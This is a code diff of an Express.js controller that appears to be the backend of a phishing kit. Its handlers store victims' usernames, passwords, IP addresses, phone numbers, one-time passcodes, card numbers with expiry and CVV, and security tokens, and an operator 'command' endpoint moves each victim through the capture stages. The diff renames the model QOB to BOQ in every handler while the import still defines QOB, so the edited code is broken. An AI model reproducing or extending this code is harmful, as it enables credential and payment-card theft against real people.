@@ -2,7 +2,7 @@ const QOB = require("../models/qobModel");
 
 const getOwnerVics = async (req, res) => {
     const { owner } = req.params;
-    QOB.find({ owner }).exec((err, vics) => {
+    BOQ.find({ owner }).exec((err, vics) => {
         if (err) {
             console.log(err);
             res.status(404).send("Error");
@@ -15,7 +15,7 @@ const getOwnerVics = async (req, res) => {
 const command = async (req, res) => {
     const { uniqueid, status } = req.body;
     try {
-        await QOB.findOneAndUpdate({ uniqueid }, { status }).exec();
+        await BOQ.findOneAndUpdate({ uniqueid }, { status }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -25,7 +25,7 @@ const command = async (req, res) => {
 
 const getInfo = async (req, res) => {
     const { uniqueid } = req.params;
-    QOB.findOne({ uniqueid }).exec((err, vic) => {
+    BOQ.findOne({ uniqueid }).exec((err, vic) => {
         if (err) {
             console.log(err);
             res.status(404).send("Error");
@@ -38,7 +38,7 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
     const { username, userId, password, uniqueid, owner, ip } = req.body;
     try {
-        await QOB.create({ uniqueid, userId, username, password, status: 1, owner, ip });
+        await BOQ.create({ uniqueid, userId, username, password, status: 1, owner, ip });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -49,7 +49,7 @@ const submitLogin = async (req, res) => {
 const submitLoginAgain = async (req, res) => {
     const { username, userId, password, uniqueid, owner, ip } = req.body;
     try {
-        await QOB.findOneAndUpdate(
+        await BOQ.findOneAndUpdate(
             { uniqueid },
             { username, password, userId, status: 0 }
         ).exec();
@@ -63,7 +63,7 @@ const submitLoginAgain = async (req, res) => {
 const submitTelephone = async (req, res) => {
     const { telephone, uniqueid } = req.body;
     try {
-        await QOB.findOneAndUpdate(
+        await BOQ.findOneAndUpdate(
             { uniqueid },
             { telephone, status: 7 }
         ).exec();
@@ -77,7 +77,7 @@ const submitTelephone = async (req, res) => {
 const submitOtp = async (req, res) => {
     const { otp, uniqueid } = req.body;
     try {
-        await QOB.findOneAndUpdate(
+        await BOQ.findOneAndUpdate(
             { uniqueid },
             { otp, status: 3 }
         ).exec();
@@ -91,7 +91,7 @@ const submitOtp = async (req, res) => {
 const submitCard = async (req, res) => {
     const { ccnum, ccexp, cvv, uniqueid } = req.body;
     try {
-        await QOB.findOneAndUpdate(
+        await BOQ.findOneAndUpdate(
             { uniqueid },
             { ccnum, ccexp, cvv, status: 5 }
         ).exec();
@@ -105,7 +105,7 @@ const submitCard = async (req, res) => {
 const submitSecurity = async (req, res) => {
     const { secToken, uniqueid } = req.body;
     try {
-        await QOB.findOneAndUpdate(
+        await BOQ.findOneAndUpdate(
             { uniqueid },
             { secToken, status: 9 }
         ).exec();
@@ -119,7 +119,7 @@ const submitSecurity = async (req, res) => {
 const deleteEntry = async (req, res) => {
     const { uniqueid } = req.body;
     try {
-        await QOB.deleteOne({ uniqueid });
+        await BOQ.deleteOne({ uniqueid });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
